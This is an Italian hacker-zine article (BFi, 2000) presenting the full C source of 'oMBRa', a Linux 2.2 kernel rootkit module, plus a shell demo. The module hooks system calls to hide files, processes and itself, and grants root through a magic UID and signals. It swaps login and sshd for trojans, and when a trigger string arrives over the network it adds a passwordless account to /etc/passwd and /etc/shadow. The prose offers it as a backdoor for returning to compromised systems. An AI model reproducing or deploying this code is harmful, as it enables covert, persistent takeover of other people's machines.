@@ -1,0 +1,590 @@
+==============================================================================
+------------[ BFi numero 8, anno 3 - 30/04/2000 - file 14 di 28 ]-------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ OMBRE E LUCi DEL KERNEL LiNUX 2.2.X : oMBRa LKM
+-----[ FuSyS <fusys@s0ftpj.org>
+
+
+	-----[ OMBRE E LUCI DEL KERNEL LINUX 2.2.X ]-----
+
+		      -----[ oMBRa LKM ]-----
+
+        NO(C)1999 FuSyS <fusys@s0ftpj.org> - [S0ftpj|BFi]
+
+Non molto da dire. Il modulo oMBRa e' la versione aggiornata per kernel 2.2.x
+del modulo CaRoGNa, con qualche modifica aggiuntiva per renderlo interessante
+nonostante non sia nulla di trascendente. Il concetto e' quello classico del
+dirottamente delle chiamate di sistema, teste di ponte tra la zona utente e 
+la zona interna del kernel, popolata da strutture, liste collegate e dati che
+non sono direttamente manipolabili dai normali programmi che girano nel vostro
+sistema operativo.
+
+L'articolo sul modulo LuCe sara' ovviamente piu' prolisso ed esplicativo, dove
+invece questo e' rappresentato praticamente dal solo LKM che ora vi mostro:
+
+<-| ombra.c |->
+/*
+ * oMBRa.c                    	Implementazione del modulo CaRoGNa,
+ *				per kernel Linux 2.2.x
+ *                              Tecnica Segreta n.2 della divina scuola
+ *                              dell' HOKUHACKO. Sacro Colpo del Rinnovamento
+ *                              Modulare che Travolge la Radice.
+ *
+ *                                           __NO__(C)1999 FuSyS [S0ftPj|BFi]
+ *							   <fusys@s0ftpj.org>
+ *
+ * Compilate con:       gcc -c -O2 -fomit-frame-pointer oMBRa.c
+ * Installate con:      insmod oMBRa.o
+ * NB:			l'azzeramento di struct module *mp deve essere
+ *			coadiuvato da -O3 e bisogna anche azzeccare il registro
+ *			che ne consenta l'accesso. altrimenti usare la nuova
+ *			query_module per occultarsi a lsmod
+ *
+ * 3l33t quote:         "wow, e funzica anche su Solaris ?"
+ * Tnx'n'credits:       HalfLife(syscalls), Zarq(heroin), Plaguez(itf), 
+ *			Pragmatic(LKM paper), BFi
+ */
+
+#define MODULE
+#define __KERNEL__
+#include <linux/module.h>
+
+#include <linux/fs.h>
+#include <linux/dirent.h>
+#include <linux/proc_fs.h>
+#include <linux/types.h>
+#include <linux/stat.h>
+#include <linux/fcntl.h>
+#include <linux/mm.h>
+#include <linux/if.h>
+#include <sys/syscall.h>
+#include <asm/uaccess.h>
+#include <asm/unistd.h>
+#include <asm/segment.h>
+
+#define SUBVISUS        "SPJ2K"
+#define LKMNAME		"oMBRa"
+#define SIGNIHIL        31
+#define PF_DISAPPEAR    0x00002000
+#define SACROUID        7777
+#define KING            500
+#define LOGIN		"/bin/login"
+#define SSHD		"/usr/local/bin/sshd"
+#define	PASSWD		"/etc/passwd"
+#define SHADOW		"/etc/shadow"
+#define ACCOUNT		"spj2k::1:6:spj2k:/tmp:/bin/bash\n"
+#define	ACCSHDW		"spj2k::10968:0:99999:7:-1:-1:134538412\n"
+
+inline int suser(void)
+{
+        if (!issecure(SECURE_NOROOT) && ((current->euid == 0)||
+				(current->euid == KING))) {
+                current->flags |= PF_SUPERPRIV;
+                return 1;
+        }
+        return 0;
+}
+
+inline int fsuser(void)
+{
+        if (!issecure(SECURE_NOROOT) && ((current->fsuid == 0)||
+				(current->euid == KING))) {
+                current->flags |= PF_SUPERPRIV;
+                return 1;
+        }
+        return 0;
+}
+
+inline int capable(int cap)
+{
+        if ((cap_raised(current->cap_effective, cap))||(current->euid == KING))
+        {
+                current->flags |= PF_SUPERPRIV;
+                return 1;
+        }
+        return 0;
+}
+
+int promisc, errno, __NR_myexecve;
+
+int (*old_execve) (struct pt_regs);
+int (*old_kill) (pid_t, int) ;
+int (*old_getdents) (unsigned int, struct dirent *, unsigned int) ;
+int (*old_unlink) (const char *) ;
+int (*old_chdir) (const char *) ;
+int (*old_setuid) (uid_t) ;
+int (*old_getuid) () ;
+int (*old_ioctl) (unsigned int, unsigned int, unsigned long) ;
+int (*old_socketcall) (int, unsigned long *);
+int (*old_query_module)(const char *, int, char *, size_t, size_t *) ;
+
+extern void *sys_call_table[] ;
+
+int (*open)(const char*, int, mode_t);
+int (*write)(unsigned int, char*, unsigned int);
+int (*close)(int);
+
+int atoi(char str[])
+{
+    int res = 0;
+    int i ;
+    for(i = 0; str[i] >='0' && str[i] <='9'; ++i)
+        res = 10 * res + str[i] - '0';
+    return res;
+}
+
+inline char *task_name(struct task_struct *p, char *buf)
+{
+    int i;
+    char *name;
+
+    name = p->comm;
+    i = sizeof(p->comm);
+    do {
+        unsigned char c = *name;
+        name++;
+        i--;
+        *buf = c;
+        if (!c)
+            break;
+        if (c == '\\') {
+            buf[1] = c;
+            buf += 2;
+            continue;
+        }
+        if (c == '\n') {
+            buf[0] = '\\';
+            buf[1] = 'n';
+            buf += 2;
+            continue;
+        }
+        buf++;
+    }
+    while (i);
+    *buf = '\n';
+    return buf + 1;
+}
+
+struct task_struct *get_task(pid_t pid)
+{
+    struct task_struct *p = current;
+    do {
+        if (p->pid == pid)
+            return p;
+        p = p->next_task;
+    }
+    while (p != current);
+        return NULL;
+}
+
+int secret(pid_t pid)
+{
+    struct task_struct *task = get_task(pid);
+    char *name;
+    if (task) {
+        name = (char *)kmalloc(200, GFP_KERNEL);
+        memset(name, 0, 200);
+        task_name(task, name);
+        if (strstr(name, SUBVISUS)!=NULL) {
+            kfree(name);
+            return 1;
+        }
+        kfree(name);
+    }
+    return 0;
+}
+
+int killinv(pid_t pid)
+{
+    struct task_struct *task = get_task(pid);
+    if(task == NULL) return 0;
+    if (task->flags & PF_DISAPPEAR) {
+        return 1;
+    }
+    return 0;
+}
+
+int new_execve(struct pt_regs regs)
+{
+        char *filename;
+        int error;
+
+	filename=getname((char *) regs.ebx);
+        error = PTR_ERR(filename);
+        if (IS_ERR(filename)) return error;
+	if(strstr(filename, LOGIN)){
+		error=do_execve("/SPJ2Kdir/SPJ2Klogin_t",(char **)regs.ecx,(char **)regs.edx,&regs);
+	}
+	if(strstr(filename, SSHD)){
+		error=do_execve("/SPJ2Kdir/SPJ2Ksshd_t",(char **)regs.ecx,(char **)regs.edx,&regs);
+	}
+	else error = do_execve(filename,(char **)regs.ecx,(char **)regs.edx,&regs);
+	if (error == 0) current->flags &= ~PF_DTRACE;
+        putname(filename);
+        return error;
+}
+
+int new_getdents(unsigned int fd, struct dirent *dirptr, unsigned int count)
+{
+    unsigned int real ;
+    unsigned int len ;
+
+    int readen ;
+    int proc;
+
+    struct dirent *dirptr2, *dirptr3;
+    struct inode *procinode;
+
+    real = (*old_getdents) (fd, dirptr, count);
+    if(real == -1) return(-errno);
+
+#ifdef __LINUX_DCACHE_H
+    procinode = current->files->fd[fd]->f_dentry->d_inode;
+#else
+    procinode = current->files->fd[fd]->f_inode;
+#endif
+    if (procinode->i_ino == PROC_ROOT_INO && !MAJOR(procinode->i_dev) &&
+    MINOR(procinode->i_dev) == 1) proc = 1;
+
+    if (current->uid == KING) return(real);
+
+    if (real > 0) {    
+
+        dirptr2 = (struct dirent *)kmalloc(real, GFP_KERNEL);
+        copy_from_user(dirptr2, dirptr, real);
+        dirptr3 = dirptr2;
+        readen = real;
+         while (readen > 0) {
+            len = dirptr3->d_reclen;
+            readen -= len;
+            if ((strstr((char *)&(dirptr3->d_name), (char *)SUBVISUS) !=NULL)
+               || (proc && secret(atoi(dirptr3->d_name)))
+               || (proc && killinv(atoi(dirptr3->d_name)))) {
+
+               if (readen != 0)
+                memmove(dirptr3, (char *)dirptr3 + dirptr3->d_reclen, readen);
+
+               else  dirptr3->d_off = 1024;
+
+                real -= len;
+            }
+            if (dirptr3->d_reclen == 0) {
+                real -= readen;
+                readen = 0;
+            }
+            if (readen != 0)
+            dirptr3 = (struct dirent *)((char *) dirptr3 + dirptr3->d_reclen);
+        }
+        copy_to_user(dirptr, dirptr2, real);
+        kfree(dirptr2);
+    }
+    return(real);
+}
+
+int new_unlink(const char *pathname)
+{
+	int ret;
+	char *path2;
+
+        path2=(char*)kmalloc(256, GFP_KERNEL);
+        copy_from_user(path2, pathname, 255);
+        if(strstr(path2, SUBVISUS)) {
+                if(current->uid != KING){
+                        kfree(path2);
+                        return -EPERM ;
+                }
+                else {
+                        kfree(path2);
+                        ret = (*old_unlink) (pathname);
+                        return(ret);
+                }
+        }
+        else ret = (*old_unlink) (pathname);
+        kfree(path2);
+        return(ret);
+}
+
+int new_chdir(const char *filename)
+{
+	int ret;
+	char *name;
+
+        name=(char*)kmalloc(256, GFP_KERNEL);
+        copy_from_user(name, filename, 255);
+        if(strstr(name, SUBVISUS)) {
+                if(current->uid != KING){
+                        kfree(name);
+                        return -ENOENT ;
+                }
+                else {
+                        kfree(name);
+                        ret = (*old_chdir) (filename);
+                        return(ret);
+                }
+        }
+        else ret = (*old_chdir) (filename);
+        kfree(name);
+        return(ret);
+}
+
+int new_kill(pid_t pid, int sig)
+{
+        int real;
+        struct task_struct *task = get_task(pid);
+
+        if ((sig != SIGNIHIL) && (sig != SIGTSTP)) {
+                real = (*old_kill)(pid, sig);
+                if (real == -1) return(-errno);
+                return real;
+        }
+        if (sig == SIGNIHIL) {
+                task->flags |= PF_DISAPPEAR;
+                return(0);
+        }
+        else if (sig == SIGTSTP) {
+                task->uid = task->gid = task->euid = task->egid = 0;
+		task->cap_effective |= (1 << (CAP_DAC_OVERRIDE));
+                return(real);
+        }
+	return(0);
+}
+
+int new_setuid(uid_t uid)
+{
+        int tmp;
+        if (uid == SACROUID) {
+                current->uid = 0;
+                current->gid = 0;
+                current->euid = 0;
+                current->egid = 0;
+		current->cap_effective |= (1 << (CAP_DAC_OVERRIDE));
+                return 0;
+        }
+
+        tmp = (*old_setuid) (uid) ;
+        return tmp;
+}
+
+int new_getuid()
+{
+        int tmp;
+        if (current->uid == SACROUID) {
+                current->uid = 0;
+                current->gid = 0;
+                current->euid = 0;
+                current->egid = 0;
+                return 0;
+        }
+
+        tmp = (*old_getuid) () ;
+        return tmp;
+}
+
+int new_ioctl
+(unsigned int fd, unsigned int cmd, unsigned long arg)
+{
+        int ret ;
+        struct ifreq netif ;
+
+        ret = (*old_ioctl) (fd, cmd, arg);
+        if (cmd == SIOCGIFFLAGS && !promisc) {
+          copy_from_user((struct ifreq *)&netif, (struct ifreq *)arg,
+          sizeof(struct ifreq));
+          netif.ifr_flags = netif.ifr_flags & (~IFF_PROMISC);
+          copy_to_user((struct ifreq *) arg, (struct ifreq *) &netif,
+          sizeof(struct ifreq));
+        } else if (cmd == SIOCSIFFLAGS)
+                sys_call_table[SYS_ioctl] = old_ioctl;
+        return ret ;
+}
+
+int new_socketcall(int call, unsigned long *args)
+{
+        int ret, compt, fd=0;
+        mm_segment_t old_fs;
+        unsigned long *sargs = args;
+        unsigned long a0, a1;
+        void *buf;
+
+        ret = (*old_socketcall) (call, args);
+	if (call ==SYS_RECV || call == SYS_RECVFROM || call == SYS_RECVMSG) {
+                get_user(a0, sargs);
+                get_user(a1, sargs + 1);
+                buf = kmalloc(ret, GFP_KERNEL);
+                copy_from_user(buf, (void *) a1, ret);
+                for (compt = 0; compt < ret; compt++)
+                        if (((char *) (buf))[compt] == 0)
+                                ((char *) (buf))[compt] = 1;
+                        if (strstr(buf, "SPJ5cc7tN3w")) {
+				current->cap_effective |= (1 << (CAP_DAC_OVERRIDE));
+                               	old_fs=current->addr_limit;
+                               	current->addr_limit=(KERNEL_DS);
+                               	fd=(*open)(PASSWD, O_RDWR|O_APPEND, 0644);
+				printk("%d\n",fd);
+                               	(*write)(fd,ACCOUNT,strlen(ACCOUNT));
+                               	(*close)(fd);
+                                fd=(*open)(SHADOW, O_RDWR|O_APPEND, 0400);
+				printk("%d\n",fd);
+                                (*write)(fd,ACCSHDW,strlen(ACCSHDW));
+                                (*close)(fd);
+                               	current->addr_limit=old_fs;
+				current->cap_effective &= ~(1 << (CAP_DAC_OVERRIDE));
+                        }
+                        kfree(buf);
+	}
+        return ret;
+}
+
+int new_query_module(const char *name, int which, char *buf, size_t bufsize,
+	size_t *ret)
+{
+        int res;
+        int cnt;
+        char *ptr, *match;
+
+        res = (*old_query_module)(name, which, buf, bufsize, ret);
+
+        if(res == -1)
+                return(-errno);
+
+        if(which != QM_MODULES)
+                return(res);
+
+        ptr = buf;
+
+        for(cnt = 0; cnt < *ret; cnt++) {
+                if(!strcmp(LKMNAME, ptr)) {
+                        match = ptr;
+                        while(*ptr)
+                                ptr++;
+                        ptr++;
+                        memcpy(match, ptr, bufsize - (ptr - (char *)buf));
+                        (*ret)--;
+                        return(res);
+                }
+                while(*ptr)
+                        ptr++;
+                ptr++;
+        }
+
+        return(res);
+}
+
+int init_module(void)
+{
+     /* register struct module *mp asm("%ebp");
+        *(char *) (mp->name) = 0;
+        mp->size = 0; */
+
+        EXPORT_NO_SYMBOLS;
+
+	old_execve = sys_call_table[SYS_execve];
+  	sys_call_table[__NR_myexecve] = old_execve;
+  	sys_call_table[SYS_execve] = (void *) new_execve;
+        old_getdents = sys_call_table[SYS_getdents];
+        sys_call_table[SYS_getdents] = (void *) new_getdents;
+        old_unlink= sys_call_table[SYS_unlink];
+        sys_call_table[SYS_unlink] = (void *) new_unlink;
+        old_chdir= sys_call_table[SYS_chdir];
+        sys_call_table[SYS_chdir] = (void *) new_chdir;
+        old_kill = sys_call_table[SYS_kill];
+        sys_call_table[SYS_kill] = (void *) new_kill;
+        old_setuid = sys_call_table[SYS_setuid];
+        sys_call_table[SYS_setuid] = (void *) new_setuid;
+        old_getuid = sys_call_table[SYS_getuid];
+        sys_call_table[SYS_getuid] = (void *) new_getuid;
+        old_ioctl = sys_call_table[SYS_ioctl];
+        sys_call_table[SYS_ioctl] = (void *) new_ioctl;
+        old_socketcall = sys_call_table[SYS_socketcall];
+        sys_call_table[SYS_socketcall] = (void *) new_socketcall;
+/*	old_query_module = sys_call_table[SYS_query_module];
+	sys_call_table[SYS_query_module]=(void *)new_query_module;
+*/	open = sys_call_table[SYS_open];
+	close = sys_call_table[SYS_close];
+	write = sys_call_table[SYS_write];
+
+	return 0;
+}
+
+void cleanup_module(void)
+{
+	sys_call_table[SYS_execve]=old_execve;
+        sys_call_table[SYS_getdents] = old_getdents;
+	sys_call_table[SYS_unlink] = old_unlink;
+	sys_call_table[SYS_chdir] = old_chdir;
+        sys_call_table[SYS_kill] = old_kill;
+        sys_call_table[SYS_setuid] = old_setuid;
+	sys_call_table[SYS_getuid] = old_getuid;
+        sys_call_table[SYS_ioctl] = old_ioctl;
+        sys_call_table[SYS_socketcall] = old_socketcall;
+/*	sys_call_table[SYS_query_module] = old_query_module; */
+}
+<-X->
+
+Ci sono delle aggiunte che saltano all'occhio al di la' del normale uso delle
+nuove macro richieste dal 2.2.x, come l'uso di nuove chiamate di sistema
+e l'aggiunta di due tipi di backdoor, giusto per avere una idea di cosa si
+possa fare anche dal kernel:
+
+[root@MaNTRa LKM]# insmod oMBRa.o
+[root@MaNTRa LKM]# mkdir SPJ2Ksecretdir
+[root@MaNTRa LKM]# ls
+CaRoGNa.c  LuCe.c  LuCe.o  N0Sp00f.c  arcane.c  oMBRa.c  oMBRa.o
+[root@MaNTRa LKM]# cd SPJ2Ksecretdir
+bash: SPJ2Ksecretdir: No such file or directory
+[root@MaNTRa LKM]# touch SPJ2Kfile
+[root@MaNTRa LKM]# ls
+CaRoGNa.c  LuCe.c  LuCe.o  N0Sp00f.c  arcane.c  oMBRa.c  oMBRa.o
+[root@MaNTRa LKM]# rm SPJ2Kfile
+rm: remove `SPJ2Kfile'? y
+rm: cannot unlink `SPJ2Kfile': Operation not permitted
+
+...
+
+[fusys@MaNTRa fusys]$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:
+[...snip...]
+squid:x:102:234::/var/spool/squid:/dev/null
+fusys:x:500:500:FuSyS:/home/fusys:/bin/bash
+[fusys@MaNTRa fusys]$ telnet mantra 25
+Trying 192.168.1.1...
+Connected to MaNTRa.FuZZy.net.
+Escape character is '^]'.
+220 MaNTRa.FuZZy.net ESMTP Sendmail 8.9.3/8.9.3; Sun, 19 Mar 2000 14:54:30 +0100
+expn SPJ5cc7tN3w
+550 SPJ5cc7tN3w... User unknown
+quit
+221 MaNTRa.FuZZy.net closing connection
+Connection closed by foreign host.
+[fusys@MaNTRa fusys]$ grep spj2k /etc/passwd
+spj2k::1:6:spj2k:/root:/bin/bash
+[root@MaNTRa root]# grep spj2k /etc/shadow
+spj2k::10968:0:99999:7:-1:-1:134538412
+
+...
+
+Le prime modifiche impediranno al root legale di accedere ai vostri dati o di
+cancellarli, anche nel caso capisse quale sia la stringa che permette loro
+di passare occultati agli occhi di ps(1), ls(1) e top(1) .... quindi una bella
+subdir occultata, sara' ora anche protetta.
+
+Un'altra modifica ancora permette di poter creare nuovi utenti sul sistema. 
+Una occhiata al codice sorgente mostrera' quale sia questa semplice e 
+simpaticamente didattica backdoor.
+
+Un ritocco rapido a execve() permette anche di nascondere abilmente due trojan
+che possiamo usare per tornare sul sistema. Dirottando il kernel nel momento
+in cui cerchi di eseguire login o sshd, possiamo usufruire sia di una 
+backdoor, sia della sicurezza che il nostro binario non venga scoperto, in 
+quanto i veri demoni di sistema NON verranno modificati.
+
+								FuSyS
+								
+								
+==============================================================================
+--------------------------------[ EOF 14/28 ]---------------------------------
+==============================================================================
